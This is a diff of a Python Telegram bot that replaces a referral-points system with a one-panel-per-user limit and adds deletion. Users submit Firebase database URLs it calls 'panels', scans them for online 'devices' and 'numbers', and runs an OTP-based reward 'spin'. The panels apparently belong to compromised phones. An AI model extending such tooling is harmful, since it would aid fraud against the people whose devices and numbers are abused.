-        f"📋 Recent referrals:\n{ref_text}\n\n"
-        f"💡 Friend joins = <b>+{REFERRAL_POINTS} points</b> for you!\n"
-        f"{FOOTER}"
-    )
-    share_url = f"https://t.me/share/url?url={urllib.parse.quote(link)}"
-    markup = InlineKeyboardMarkup()
-    markup.row(btn("📤 SHARE LINK", url=share_url))
-    markup.row(btn("🔙 BACK", callback_data="main_menu"))
-    if edit and message_id:
-        safe_edit(chat_id, message_id, text, markup)
-    else:
-        bot.send_message(chat_id, text, reply_markup=markup, parse_mode="HTML")
-
-
-def send_my_referrals(chat_id, message_id=None, edit=True):
-    """MY REFERRALS menu: show count and points earned."""
-    count = get_referral_count(chat_id)
-    points_earned = count * REFERRAL_POINTS
-    text = (
-        f"👥 <b>MY REFERRALS</b>\n"
-        f"━━━━━━━━━━━━━━━━━━━━━━━━━━\n"
-        f"✅ Successful referrals: <b>{count}</b>\n"
-        f"💎 Points earned: <b>{points_earned}</b>\n"
-        f"━━━━━━━━━━━━━━━━━━━━━━━━━━\n"
-        f"🎯 Invite more friends to earn more!\n"
-        f"Each referral = <b>+{REFERRAL_POINTS} points</b>\n\n"
-        f"Get your link from the menu 👉 🔗 REFERRAL LINK\n"
-        f"{FOOTER}"
-    )
-    markup = InlineKeyboardMarkup()
-    markup.row(btn("🔗 GET MY LINK", callback_data="referral_link"))
-    markup.row(btn("🔙 BACK", callback_data="main_menu"))
     if edit and message_id:
         safe_edit(chat_id, message_id, text, markup)
     else:
@@ -1910,18 +1746,16 @@ def _fb_row_text(r):
 
 
 def _firebase_list_markup(rows, with_select=True, page=0, total_pages=1, selected_id=None):
-    """One SELECT button per row (hidden once the user locked a panel) + pagination."""
+    """One SELECT + one DELETE button per row + pagination."""
     kb = InlineKeyboardMarkup(row_width=1)
-    locked = selected_id is not None
     for r in rows:
         short = _fb_short(r["firebase_url"])
-        if with_select and not locked:
-            kb.row(btn(f"🎡 SELECT — {short}", callback_data=f"fb_sel_{r['id']}"))
-        elif locked:
+        if with_select:
             if r["id"] == selected_id:
                 kb.row(btn(f"🔒 SELECTED — {short}", callback_data="noop"))
             else:
-                kb.row(btn(f"🔒 LOCKED — {short}", callback_data="noop"))
+                kb.row(btn(f"🎡 SELECT — {short}", callback_data=f"fb_sel_{r['id']}"))
+        kb.row(btn(f"🗑️ DELETE — {short}", callback_data=f"fb_my_del_{r['id']}"))
     nav = []
     if page > 0:
         nav.append(btn("⬅️ PREV", callback_data=f"my_fb_page_{page - 1}"))
@@ -1933,9 +1767,7 @@ def _firebase_list_markup(rows, with_select=True, page=0, total_pages=1, selecte
 
 
 def send_my_firebase(chat_id, message_id=None, page=0, edit=True):
-    """MY FIREBASE: list all URLs added by the user with status + SELECT."""
-    user = get_user(chat_id)
-    points = user["points"] if user else 0
+    """MY FIREBASE: list the URLs added by the user with status + SELECT/DELETE."""
     rows = get_user_firebases(chat_id)
     selected = get_selected_firebase(chat_id)
     total_pages = max(1, (len(rows) + MYFB_PAGE_SIZE - 1) // MYFB_PAGE_SIZE)
@@ -1948,9 +1780,9 @@ def send_my_firebase(chat_id, message_id=None, page=0, edit=True):
         body = (
             f"📂 <b>MY FIREBASE</b>\n"
             f"━━━━━━━━━━━━━━━━━━━━━━━━━━\n"
-            f"❌ You have not added any Firebase URLs yet.\n\n"
-            f"💎 Points: <b>{points}</b> (1 point per URL)\n"
-            f"Press 📁 ADD FIREBASE to add one (or many)!\n"
+            f"❌ You have not added any Firebase URL yet.\n\n"
+            f"📁 Limit: <b>1 panel</b> per user\n"
+            f"Press 📁 ADD FIREBASE to add yours!\n"
             f"{FOOTER}"
         )
         markup = InlineKeyboardMarkup(row_width=1)
@@ -1959,18 +1791,19 @@ def send_my_firebase(chat_id, message_id=None, page=0, edit=True):
     else:
         lines = "\n".join(_fb_row_text(r) for r in page_rows)
         nav_note = f" (page {page + 1}/{total_pages})" if total_pages > 1 else ""
-        selected_note = ""
         if selected:
             selected_note = (
                 f"\n🔒 Selected panel: <code>{escape(_fb_short(selected['firebase_url']))}</code>\n"
-                f"To change it, contact the admin."
+                f"Tap 🎡 SELECT to process it.\n"
+                f"🗑️ Not working? Delete it with 🗑️ and add a new one."
             )
         else:
-            selected_note = f"\n🎡 Tap 🎡 SELECT on the panel you want to process."
+            selected_note = (
+                f"\n🎡 Tap 🎡 SELECT on your panel to process it.\n"
+                f"🗑️ Not working? Delete it with 🗑️ and add a new one."
+            )
         body = (
             f"📂 <b>MY FIREBASE</b>{nav_note}\n"
-            f"━━━━━━━━━━━━━━━━━━━━━━━━━━\n"
-            f"💎 Points: <b>{points}</b>\n"
             f"━━━━━━━━━━━━━━━━━━━━━━━━━━\n"
             f"{lines}\n"
             f"━━━━━━━━━━━━━━━━━━━━━━━━━━\n"
@@ -1992,11 +1825,8 @@ def send_my_firebase(chat_id, message_id=None, page=0, edit=True):
 def send_firebase_selection(chat_id, message_id=None, edit=True):
     """
     Selection screen shown after scanning: every URL with its device count
-    and a SELECT button (success style) for panels that found online devices.
-    Once a panel is locked, the SELECT buttons disappear.
+    and a SELECT button for panels that found online devices.
     """
-    user = get_user(chat_id)
-    points = user["points"] if user else 0
     rows = get_user_firebases(chat_id)
     selected = get_selected_firebase(chat_id)
     selectable = [r for r in rows if r["status"] == "scanned"]
@@ -2006,10 +1836,9 @@ def send_firebase_selection(chat_id, message_id=None, edit=True):
         body = (
             f"🎯 <b>SELECT A PANEL</b>\n"
             f"━━━━━━━━━━━━━━━━━━━━━━━━━━\n"
-            f"🔒 You already have a selected panel:\n"
+            f"🔒 Your selected panel:\n"
             f"<code>{escape(selected['firebase_url'])}</code>\n\n"
-            f"⚠️ You cannot change it yourself — contact admin.\n"
-            f"💬 {GROUP_LINK}\n"
+            f"📂 See <b>MY FIREBASE</b> to process it or delete it.\n"
             f"{FOOTER}"
         )
         markup = InlineKeyboardMarkup(row_width=1)
@@ -2026,9 +1855,8 @@ def send_firebase_selection(chat_id, message_id=None, edit=True):
             f"🎯 <b>SELECT A PANEL</b>\n"
             f"━━━━━━━━━━━━━━━━━━━━━━━━━━\n"
             f"❌ No URL has online devices right now.\n\n"
-            f"💡 Add other URLs with 📁 ADD FIREBASE, or\n"
+            f"💡 Add your Firebase URL with 📁 ADD FIREBASE, or\n"
             f"💡 Panels may be offline - try again later.\n"
-            f"💎 Points: <b>{points}</b>\n"
             f"{FOOTER}"
         )
         markup = InlineKeyboardMarkup(row_width=1)
@@ -2061,7 +1889,8 @@ def send_firebase_selection(chat_id, message_id=None, edit=True):
         f"{lines}\n"
         f"━━━━━━━━━━━━━━━━━━━━━━━━━━\n"
         f"Tap 🎡 SELECT on the panel you want to process.\n"
-        f"Only <b>one</b> panel can be selected — after that it is 🔒 locked.\n"
+        f"Only <b>one</b> panel per user — delete it in 📂 MY FIREBASE "
+        f"if it stops working and add a new one.\n"
         f"{other_lines}\n"
         f"{FOOTER}"
     )
@@ -2091,23 +1920,20 @@ def is_valid_firebase_url(raw_url):
 
 
 def start_add_firebase(chat_id, message_id=None):
-    """Entry point of the ADD FIREBASE flow (checks points first)."""
+    """Entry point of the ADD FIREBASE flow (enforces the 1-panel limit)."""
     user = get_user(chat_id)
     if not user:
         return
-    points = user.get("points") or 0
-    if points < FIREBASE_COST:
+    if get_firebase_count(chat_id) >= 1:
         kb = InlineKeyboardMarkup(row_width=1)
-        kb.row(btn("🔗 GET REFERRAL LINK", callback_data="referral_link"))
         kb.row(btn("📂 MY FIREBASE", callback_data="my_firebase"))
         bot.send_message(
             chat_id,
-            f"❌ <b>You need at least 1 point to add Firebase!</b>\n"
+            f"❌ <b>You already have 1 Firebase panel.</b>\n"
             f"━━━━━━━━━━━━━━━━━━━━━━━━━━\n"
-            f"💎 Your Points: <b>{points}</b>\n"
-            f"💳 Cost per URL: <b>{FIREBASE_COST} point</b>\n\n"
-            f"👉 Refer friends to earn more points, or\n"
-            f"👉 Contact admin to top up your balance\n"
+            f"📂 Limit: <b>1 panel per user</b>.\n\n"
+            f"👉 If your panel is not working, go to <b>📂 MY FIREBASE</b>, "
+            f"<b>DELETE</b> the existing one and add a new panel.\n"
             f"{FOOTER}",
             reply_markup=kb,
         )
@@ -2116,18 +1942,15 @@ def start_add_firebase(chat_id, message_id=None):
         firebase_confirmations.pop(chat_id, None)
         firebase_states[chat_id] = {"step": "awaiting_url"}
     text = (
-        f"📁 <b>ADD FIREBASE (BULK)</b>\n"
+        f"📁 <b>ADD FIREBASE</b> (1 panel only)\n"
         f"━━━━━━━━━━━━━━━━━━━━━━━━━━\n"
-        f"💎 Your Points: <b>{points}</b>\n"
-        f"💳 Cost: <b>{FIREBASE_COST} point</b> per URL\n"
-        f"━━━━━━━━━━━━━━━━━━━━━━━━━━\n"
-        f"Send <b>one Firebase URL per line</b> "
-        f"(you can paste several at once):\n\n"
+        f"Send your <b>Firebase URL</b>:\n\n"
         f"Example:\n"
-        f"<code>https://panel-name-default-rtdb.firebaseio.com</code>\n"
-        f"<code>https://panel2-default-rtdb.asia-southeast1.firebasedatabase.app</code>\n\n"
-        f"Your URLs will be validated, then you confirm before anything "
-        f"is added or charged.\n\n"
+        f"<code>https://panel-name-default-rtdb.firebaseio.com</code>\n\n"
+        f"🔍 First your URL is <b>checked</b> - you will see how many "
+        f"<b>devices</b> and <b>numbers</b> it has.\n"
+        f"✅ Only after you confirm is the panel saved.\n"
+        f"🗑️ You can <b>delete it anytime</b> and add a new one.\n\n"
         f"❌ Send /cancel to abort.\n"
         f"{FOOTER}"
     )
@@ -2180,9 +2003,10 @@ def scan_firebases_and_present(chat_id, message_id):
 
 def handle_add_firebase_text(chat_id, text):
     """
-    Bulk add flow: parse newline separated URLs, validate each, filter
-    duplicates, then show a CONFIRMATION (with the total point cost) before
-    anything is inserted or charged. Nothing is added until the user taps ✅.
+    Add flow: parse the URL, validate it, filter duplicates, then CHECK it
+    (devices + numbers) in a background job. After the check, a
+    confirmation with an "ADD" button is shown. Nothing is saved until the
+    user confirms. Only ONE panel per user is allowed.
     """
     raw_urls = [line.strip() for line in (text or "").splitlines() if line.strip()]
     valid, invalid = [], []
@@ -2196,10 +2020,10 @@ def handle_add_firebase_text(chat_id, text):
     if not valid:
         bot.send_message(
             chat_id,
-            f"❌ <b>No valid Firebase URLs found.</b>\n"
+            f"❌ <b>No valid Firebase URL found.</b>\n"
             f"━━━━━━━━━━━━━━━━━━━━━━━━━━\n"
             + ("\n".join(f"• {escape(a[:60])}: {b}" for a, b in invalid[:5]) if invalid
-               else "Send URLs starting with <b>https://</b> containing "
+               else "Send a URL starting with <b>https://</b> containing "
                      "<b>firebaseio.com</b> or <b>firebasedatabase.app</b>") +
             f"\n\n👉 Try again, or send /cancel to abort.\n"
             f"{FOOTER}",
@@ -2207,7 +2031,7 @@ def handle_add_firebase_text(chat_id, text):
         )
         return
 
-    # Filter URLs this user already added (skipped, never charged)
+    # Filter URLs this user already added
     new_urls, dupes = [], []
     for url in valid:
         if is_duplicate_firebase(chat_id, url):
@@ -2224,73 +2048,159 @@ def handle_add_firebase_text(chat_id, text):
             f"❌ <b>Nothing new to add.</b>\n"
             f"━━━━━━━━━━━━━━━━━━━━━━━━━━\n"
             f"🔁 Already added by you: <b>{len(dupes)}</b>\n"
-            f"📂 Each of these URLs is already in your MY FIREBASE.\n"
+            f"📂 This URL is already in your MY FIREBASE.\n"
             f"{FOOTER}",
             parse_mode="HTML",
         )
         return
 
-    cost = len(new_urls) * FIREBASE_COST
-    user = get_user(chat_id)
-    points = user["points"] if user else 0
-    if points < cost:
+    if get_firebase_count(chat_id) >= 1:
         kb = InlineKeyboardMarkup(row_width=1)
-        kb.row(btn("🔗 GET REFERRAL LINK", callback_data="referral_link"))
+        kb.row(btn("📂 MY FIREBASE", callback_data="my_firebase"))
         bot.send_message(
             chat_id,
-            f"❌ <b>Not enough points!</b>\n"
+            f"❌ <b>You already have 1 Firebase panel.</b>\n"
             f"━━━━━━━━━━━━━━━━━━━━━━━━━━\n"
-            f"📁 Valid URLs to add: <b>{len(new_urls)}</b>\n"
-            f"💳 Cost: <b>{cost}</b> points\n"
-            f"💎 Your balance: <b>{points}</b>\n\n"
-            f"👉 You need <b>{cost - points}</b> more point(s). "
-            f"Refer friends or contact admin.\n"
+            f"📂 Limit: <b>1 panel per user</b>.\n\n"
+            f"👉 Delete the existing panel from <b>📂 MY FIREBASE</b> "
+            f"first, then add a new one.\n"
             f"{FOOTER}",
             reply_markup=kb,
+            parse_mode="HTML",
         )
         return
+
+    if len(new_urls) > 1:
+        extra_note = f"⚠️ You sent <b>{len(new_urls)}</b> URLs — only <b>1 panel</b> is allowed, so only the first one will be checked.\n"
+    else:
+        extra_note = ""
 
     # Store the confirmation until the user presses ✅ / ❌
     with _state_lock:
         firebase_confirmations[chat_id] = {
-            "urls": new_urls, "dupes": dupes, "cost": cost,
+            "entries": [{"url": new_urls[0], "panel": None, "summary": None, "added": False}],
+            "dupes": dupes,
+            "_ts": time.time(),
         }
 
-    line_list = "\n".join(
-        f"• <code>{escape(_fb_short(u))}</code>" for u in new_urls[:10]
-    )
-    if len(new_urls) > 10:
-        line_list += f"\n  ... and {len(new_urls) - 10} more"
-    dup_note = ""
-    if dupes:
-        dup_note = f"\n🔁 Skipped (already added by you): <b>{len(dupes)}</b>\n"
+    try:
+        msg = bot.send_message(
+            chat_id,
+            f"🔍 <b>CHECKING FIREBASE URL</b>\n"
+            f"━━━━━━━━━━━━━━━━━━━━━━━━━━\n"
+            f"{extra_note}"
+            f"Checking <code>{escape(new_urls[0])}</code> for online devices...\n"
+            f"This takes a few seconds.\n"
+            f"{FOOTER}",
+            parse_mode="HTML",
+        )
+        mid = msg.message_id
+    except Exception:
+        mid = 0
 
-    kb = InlineKeyboardMarkup(row_width=2)
-    kb.row(btn(f"✅ ADD ALL ({cost} 💎)", callback_data="fb_add_confirm"))
+    # Check (scan) the URL in the background - never blocks the bot
+    _enqueue_job("check", (chat_id, mid))
+
+
+def check_firebases_and_confirm(chat_id, message_id):
+    """
+    Background job: scan every pending URL of the confirmation, edit the
+    same message with progress, then show the CONFIRMATION with device &
+    number counts and per-URL ADD THIS buttons.
+    """
+    with _state_lock:
+        conf = firebase_confirmations.get(chat_id)
+    if not conf:
+        return
+    entries = list(conf.get("entries") or [])
+    total = len(entries)
+    done = 0
+    for e in entries:
+        done += 1
+        url = e["url"]
+        try:
+            panel = check_panel_active(url)
+        except Exception as exc:
+            logger.error("pre-check failed for %s: %s", url, exc)
+            panel = None
+        if panel:
+            e["panel"] = panel
+            e["summary"] = (f"🖥️ {panel['total_devices']} devices | "
+                            f"📱 {panel['total_numbers']} numbers")
+        else:
+            e["panel"] = None
+            e["summary"] = "❌ No online devices / offline"
+        text = (
+            f"🔍 <b>CHECKING FIREBASE URL</b>\n"
+            f"━━━━━━━━━━━━━━━━━━━━━━━━━━\n"
+            f"📡 Progress: <b>{done}/{total}</b>\n"
+            f"━━━━━━━━━━━━━━━━━━━━━━━━━━\n"
+            f"🔗 <code>{escape(url)}</code>\n"
+            f"📊 {e['summary']}\n"
+            f"{FOOTER}"
+        )
+        progress_edit(chat_id, message_id, text)
+        time.sleep(1)
+
+    with _state_lock:
+        cur = firebase_confirmations.get(chat_id)
+        if cur is not None:
+            cur["entries"] = entries
+    send_firebase_confirmation(chat_id, message_id)
+
+
+def send_firebase_confirmation(chat_id, message_id):
+    """Show the confirmation with the device/number count + ADD button."""
+    with _state_lock:
+        conf = firebase_confirmations.get(chat_id)
+    if not conf:
+        return
+    entries = conf.get("entries") or []
+    remaining = [e for e in entries if not e.get("added")]
+    remaining_count = len(remaining)
+
+    lines = []
+    for e in entries:
+        short = _fb_short(e["url"])
+        if e.get("added"):
+            lines.append(f"✅ <code>{escape(short)}</code> — added ✔️")
+        else:
+            lines.append(f"{_STATUS_EMOJI.get('scanned', '📡')} <code>{escape(short)}</code> — {e.get('summary') or '⏳ checking...'}")
+
+    dup_note = ""
+    if conf.get("dupes"):
+        dup_note = f"🔁 Skipped (already added by you): <b>{len(conf['dupes'])}</b>\n"
+
+    kb = InlineKeyboardMarkup(row_width=1)
+    for idx, e in enumerate(entries):
+        if e.get("added"):
+            continue
+        short = _fb_short(e["url"])
+        kb.row(btn(f"✅ ADD THIS — {short}", callback_data=f"fb_add_one_{idx}"))
+    if remaining_count > 0:
+        kb.row(btn("✅ ADD PANEL", callback_data="fb_add_confirm"))
     kb.row(btn("❌ CANCEL", callback_data="fb_add_cancel"))
-    bot.send_message(
-        chat_id,
+
+    body = (
         f"📁 <b>CONFIRM ADDING FIREBASE</b>\n"
         f"━━━━━━━━━━━━━━━━━━━━━━━━━━\n"
-        f"🧾 URLs to add: <b>{len(new_urls)}</b>\n"
-        f"💳 Total cost: <b>{cost} point(s)</b>\n"
-        f"💎 Your balance: <b>{points}</b>\n"
+        f"🧾 To add: <b>{remaining_count}</b> panel (max 1)\n"
         f"━━━━━━━━━━━━━━━━━━━━━━━━━━\n"
-        f"{line_list}\n"
+        f"{chr(10).join(lines)}\n"
         f"{dup_note}"
         f"━━━━━━━━━━━━━━━━━━━━━━━━━━\n"
-        f"Only on <b>✅ ADD ALL</b> will the points be deducted and "
-        f"the URLs be added + scanned.\n"
-        f"{FOOTER}",
-        reply_markup=kb,
-        parse_mode="HTML",
+        f"Tap <b>✅ ADD THIS</b> to save it.\n"
+        f"🗑️ You can <b>delete it anytime</b> from 📂 MY FIREBASE and add "
+        f"a new one.\n"
+        f"{FOOTER}"
     )
+    progress_edit(chat_id, message_id, body, kb)
 
 
 def confirm_firebase_add(chat_id, message_id):
     """
-    User confirmed: insert every URL, deduct the points, start scanning.
-    If points ran out before confirmation, abort with an error.
+    User pressed ADD PANEL: insert the remaining entry (already checked),
+    then show the SELECT screen immediately.
     """
     with _state_lock:
         conf = firebase_confirmations.pop(chat_id, None)
@@ -2299,50 +2209,40 @@ def confirm_firebase_add(chat_id, message_id):
                          "❌ No pending Firebase confirmation found. "
                          "Please start over with 📁 ADD FIREBASE.")
         return
-    new_urls = conf["urls"]
-    cost = conf["cost"]
+    entries = [e for e in (conf.get("entries") or []) if not e.get("added")]
 
-    user = get_user(chat_id)
-    points = user["points"] if user else 0
-    if not user or points < cost:
+    if get_firebase_count(chat_id) >= 1:
+        kb = InlineKeyboardMarkup(row_width=1)
+        kb.row(btn("📂 MY FIREBASE", callback_data="my_firebase"))
         bot.send_message(
             chat_id,
-            f"❌ <b>Not enough points anymore.</b>\n"
+            f"❌ <b>You already have 1 Firebase panel.</b>\n"
             f"━━━━━━━━━━━━━━━━━━━━━━━━━━\n"
-            f"💳 Cost: <b>{cost}</b> points\n"
-            f"💎 Your balance: <b>{points}</b>\n"
-            f"No points were deducted and nothing was added.\n"
+            f"Delete the existing panel from 📂 MY FIREBASE first.\n"
             f"{FOOTER}",
+            reply_markup=kb,
             parse_mode="HTML",
         )
         return
 
-    # Insert rows first, then deduct points atomically
+    # Insert rows (status scanned - already checked)
     added = 0
     failed = []
-    for url in new_urls:
-        if is_duplicate_firebase(chat_id, url):
-            continue  # safety race: skip, never double-charge
-        if add_firebase(chat_id, url):
+    for e in entries:
+        if is_duplicate_firebase(chat_id, e["url"]):
+            continue  # safety race: skip
+        summary = e.get("summary") or "📡 Scanned"
+        if add_firebase(chat_id, e["url"], status="scanned", summary=summary):
             added += 1
         else:
-            failed.append(url)
-
-    # Deduct only the points for what actually got inserted
-    deduct = added * FIREBASE_COST
-    if deduct > 0:
-        if not try_deduct_points(chat_id, deduct):
-            # Extremely unlikely (we already checked above): keep the rows but
-            # log it so the admin can top the user up if really needed.
-            logger.error("Point deduction failed for %s after adding %d URLs",
-                         chat_id, added)
+            failed.append(e["url"])
 
     if added == 0:
         bot.send_message(
             chat_id,
             f"❌ <b>Could not add any URL.</b>\n"
             f"━━━━━━━━━━━━━━━━━━━━━━━━━━\n"
-            f"Maybe they were already added moments ago.\n"
+            f"Maybe it was already added moments ago.\n"
             f"{FOOTER}",
             parse_mode="HTML",
         )
@@ -2355,27 +2255,82 @@ def confirm_firebase_add(chat_id, message_id):
         notes.append(f"⚠️ Failed to insert: <b>{len(failed)}</b>")
     note_text = "\n".join(notes) + ("\n" if notes else "")
 
-    user = get_user(chat_id)
-    points_left = user["points"] if user else 0
     try:
         msg = bot.send_message(
             chat_id,
-            f"✅ <b>Added {added} Firebase URL(s)</b>\n"
+            f"✅ <b>Added 1 Firebase panel</b>\n"
             f"━━━━━━━━━━━━━━━━━━━━━━━━━━\n"
             f"{note_text}"
-            f"💳 Points deducted: <b>{deduct}</b>\n"
-            f"💎 Points left: <b>{points_left}</b>\n"
-            f"━━━━━━━━━━━━━━━━━━━━━━━━━━\n"
-            f"🔍 Scanning for online devices...\n"
+            f"🎯 The panel is already checked - select it to process!\n"
+            f"🗑️ You can delete it anytime from 📂 MY FIREBASE.\n"
             f"{FOOTER}",
             parse_mode="HTML",
         )
         mid = msg.message_id
     except Exception:
-        mid = 0  # progress_edit will resend if needed
+        mid = 0
 
-    # Scan everything in the queue (never blocks the bot, never piles up)
-    _enqueue_job("scan", (chat_id, mid))
+    # Panels are already checked -> present the SELECT screen directly
+    send_firebase_selection(chat_id, mid, edit=True)
+
+
+def confirm_firebase_add_one(chat_id, message_id, idx, call=None):
+    """
+    User tapped ADD THIS on the URL: insert that one panel (already
+    checked) and refresh the confirmation message. When the last URL is
+    added, show the SELECT screen.
+    """
+    with _state_lock:
+        conf = firebase_confirmations.get(chat_id)
+        entry = None
+        if conf and 0 <= idx < len(conf.get("entries") or []):
+            entry = conf["entries"][idx]
+    if not entry:
+        if call:
+            bot.answer_callback_query(call.id,
+                                      "❌ Confirmation expired. Start over.",
+                                      show_alert=True)
+        return
+    if entry.get("added"):
+        if call:
+            bot.answer_callback_query(call.id, "✅ Already added.",
+                                      show_alert=True)
+        return
+    if is_duplicate_firebase(chat_id, entry["url"]):
+        entry["added"] = True
+        if call:
+            bot.answer_callback_query(call.id, "🔁 Already in your list.",
+                                      show_alert=True)
+        send_firebase_confirmation(chat_id, message_id)
+        return
+
+    if get_firebase_count(chat_id) >= 1:
+        if call:
+            bot.answer_callback_query(call.id,
+                                      "❌ You already have 1 panel. Delete it first.",
+                                      show_alert=True)
+        return
+
+    summary = entry.get("summary") or "📡 Scanned"
+    fb_id = add_firebase(chat_id, entry["url"], status="scanned", summary=summary)
+    if not fb_id:
+        if call:
+            bot.answer_callback_query(call.id, "❌ Failed to add.",
+                                      show_alert=True)
+        return
+    entry["added"] = True
+    if call:
+        bot.answer_callback_query(call.id, "✅ Added!", show_alert=False)
+
+    with _state_lock:
+        cur = firebase_confirmations.get(chat_id)
+        remaining = [e for e in (cur.get("entries") or []) if not e.get("added")] if cur else []
+    if remaining:
+        send_firebase_confirmation(chat_id, message_id)
+    else:
+        with _state_lock:
+            firebase_confirmations.pop(chat_id, None)
+        send_firebase_selection(chat_id, None, edit=False)
 
 
 def cancel_firebase_add(chat_id):
@@ -2384,10 +2339,58 @@ def cancel_firebase_add(chat_id):
         firebase_confirmations.pop(chat_id, None)
 
 
+def confirm_user_delete_firebase(chat_id, message_id, fb_id):
+    """Ask the user to confirm deleting their own Firebase entry."""
+    fb = get_firebase_by_id(fb_id)
+    if not fb or fb["user_id"] != chat_id:
+        return
+    kb = InlineKeyboardMarkup(row_width=2)
+    kb.row(btn("🗑️ YES, DELETE", callback_data=f"fb_my_del_yes_{fb_id}"))
+    kb.row(btn("❌ CANCEL", callback_data="my_firebase"))
+    safe_edit(
+        chat_id,
+        message_id,
+        f"🗑️ <b>Confirm deleting your panel?</b>\n"
+        f"━━━━━━━━━━━━━━━━━━━━━━━━━━\n"
+        f"<code>{escape(fb['firebase_url'])}</code>\n\n"
+        f"⚠️ After deleting you can add a <b>new panel</b> anytime "
+        f"(max 1 per user).\n"
+        f"{FOOTER}",
+        kb,
+    )
+
+
+def user_delete_firebase(chat_id, message_id, fb_id, call):
+    """Actually delete the user's own Firebase entry."""
+    fb = get_firebase_by_id(fb_id)
+    if not fb or fb["user_id"] != chat_id:
+        bot.answer_callback_query(call.id, "❌ Entry not found.", show_alert=True)
+        return
+    if delete_firebase(fb_id):
+        bot.answer_callback_query(call.id, "✅ Deleted! You can add a new one.",
+                                  show_alert=True)
+        try:
+            bot.send_message(
+                chat_id,
+                f"🗑️ <b>Panel deleted</b>\n"
+                f"━━━━━━━━━━━━━━━━━━━━━━━━━━\n"
+                f"<code>{escape(fb['firebase_url'])}</code>\n\n"
+                f"📁 You can now add a <b>new panel</b> with 📁 ADD FIREBASE "
+                f"(max 1).\n"
+                f"{FOOTER}",
+                parse_mode="HTML",
+            )
+        except Exception:
+            pass
+        send_my_firebase(chat_id, None, edit=False)
+    else:
+        bot.answer_callback_query(call.id, "❌ Delete failed.", show_alert=True)
+
+
 def select_firebase(chat_id, message_id, fb_id, call):
     """
-    Handle a SELECT tap: locks the panel FOREVER (only admin can change it).
-    Launches the full processing job editing the current message.
+    Handle a SELECT tap: marks the panel as selected and launches the full
+    processing job editing the current message.
     """
     fb = get_firebase_by_id(fb_id)
     if not fb or fb["user_id"] != chat_id:
@@ -2397,7 +2400,8 @@ def select_firebase(chat_id, message_id, fb_id, call):
     if existing and existing["id"] != fb_id:
         bot.answer_callback_query(
             call.id,
-            "You already have a selected panel. To change it, contact admin.",
+            "You already have a selected panel. Delete it first if you want "
+            "to select another one.",
             show_alert=True,
         )
         return
@@ -2423,7 +2427,7 @@ def select_firebase(chat_id, message_id, fb_id, call):
             show_alert=True,
         )
         return
-    bot.answer_callback_query(call.id, "✅ Panel locked & processing started!")
+    bot.answer_callback_query(call.id, "✅ Panel selected & processing started!")
 
 
 # ─────────────────────────── SPIN FLOW ───────────────────────────
@@ -2441,18 +2445,6 @@ def start_spin(chat_id, message_id=None):
             bot.send_message(chat_id,
                              "⚠️ A spin is already in progress.\n"
                              "Finish it or send /cancel to abort.")
-            return
-        if (user.get("points") or 0) < SPIN_COST:
-            kb = InlineKeyboardMarkup()
-            kb.row(btn("🔗 GET REFERRAL LINK", callback_data="referral_link"))
-            bot.send_message(
-                chat_id,
-                f"❌ You need at least <b>{SPIN_COST} point</b> to spin!\n\n"
-                f"💡 Invite friends using your referral link to earn "
-                f"<b>+{REFERRAL_POINTS} points</b> each!\n"
-                f"{FOOTER}",
-                reply_markup=kb,
-            )
             return
         spin_sessions[chat_id] = {"step": "phone", "_ts": time.time()}
     text = (
@@ -2519,7 +2511,7 @@ def handle_spin_phone(chat_id, text):
 
 
 def handle_spin_otp(chat_id, text):
-    """Verify OTP, spin the wheel, claim the reward, deduct 1 point."""
+    """Verify OTP, spin the wheel, claim the reward, record history (FREE)."""
     with _state_lock:
         state = spin_sessions.get(chat_id)
     if not state:
@@ -2545,7 +2537,7 @@ def handle_spin_otp(chat_id, text):
         with _state_lock:
             spin_sessions.pop(chat_id, None)
         bot.send_message(chat_id,
-                         "❌ Spin failed (server error). Your points are safe.\n"
+                         "❌ Spin failed (server error).\n"
                          "Please try again later.\n"
                          f"{FOOTER}")
         return
@@ -2557,23 +2549,13 @@ def handle_spin_otp(chat_id, text):
         bot.send_message(chat_id,
                          f"⚠️ You won <b>{escape(reward)}</b> but the claim "
                          f"request failed.\nPlease contact support or try "
-                         f"again later.\nYour points were NOT deducted.\n"
+                         f"again later.\n"
                          f"{FOOTER}")
         return
-    # Success: deduct exactly one point (only on success) and record history
-    if not try_deduct_points(chat_id, SPIN_COST):
-        with _state_lock:
-            spin_sessions.pop(chat_id, None)
-        bot.send_message(chat_id,
-                         f"🎉 You won <b>{escape(reward)}</b>! But your point "
-                         f"balance was already too low - contact admin.\n"
-                         f"{FOOTER}")
-        return
+    # Success: record history (spin is completely FREE)
     record_spin(chat_id, phone, reward)
     with _state_lock:
         spin_sessions.pop(chat_id, None)
-    user = get_user(chat_id)
-    points_left = user["points"] if user else 0
     kb = InlineKeyboardMarkup()
     kb.row(btn("🎡 SPIN AGAIN", callback_data="spin_now"))
     kb.row(btn("🔙 MAIN MENU", callback_data="main_menu"))
@@ -2583,9 +2565,7 @@ def handle_spin_otp(chat_id, text):
         f"━━━━━━━━━━━━━━━━━━━━━━━━━━\n"
         f"🎁 You won: <b>{escape(reward)}</b>\n"
         f"━━━━━━━━━━━━━━━━━━━━━━━━━━\n"
-        f"💎 Points used: <b>{SPIN_COST}</b>\n"
-        f"💎 Points left: <b>{points_left}</b>\n\n"
-        f"Spin again or refer friends for more points!\n"
+        f"Spin again — it's completely free!\n"
         f"{FOOTER}",
         reply_markup=kb,
     )
@@ -2639,14 +2619,9 @@ def send_admin_stats(chat_id, message_id=None, edit=True):
         f"📢 Channel joined: <b>{s['channel_joined']}</b>\n"
         f"⛔ Banned: <b>{s['banned']}</b>\n"
         f"━━━━━━━━━━━━━━━━━━━━━━━━━━\n"
-        f"🔗 Total referrals: <b>{s['total_referrals']}</b>\n"
         f"🔥 Firebase URLs added: <b>{s['total_firebases']}</b>\n"
         f"🎡 Total spins: <b>{s['total_spins']}</b>\n"
         f"🎡 Spins today: <b>{s['spins_today']}</b>\n"
-        f"━━━━━━━━━━━━━━━━━━━━━━━━━━\n"
-        f"💎 Points given (referrals): <b>{s['points_awarded']}</b>\n"
-        f"🎰 Points spent (spins): <b>{s['points_spent']}</b>\n"
-        f"👛 Points in wallets: <b>{s['points_in_wallets']}</b>\n"
         f"{FOOTER}"
     )
     markup = back_markup("admin_panel")
@@ -2658,29 +2633,14 @@ def send_admin_stats(chat_id, message_id=None, edit=True):
 
 def send_admin_analytics(chat_id, message_id=None, edit=True):
     a = get_analytics()
-    top = a["top_referrers"]
-    if top:
-        top_text = "\n".join(
-            f"🥇 {i + 1}. {escape(t['name'])} {escape(t['handle'])} — "
-            f"<b>{t['count']}</b> refs"
-            for i, t in enumerate(top)
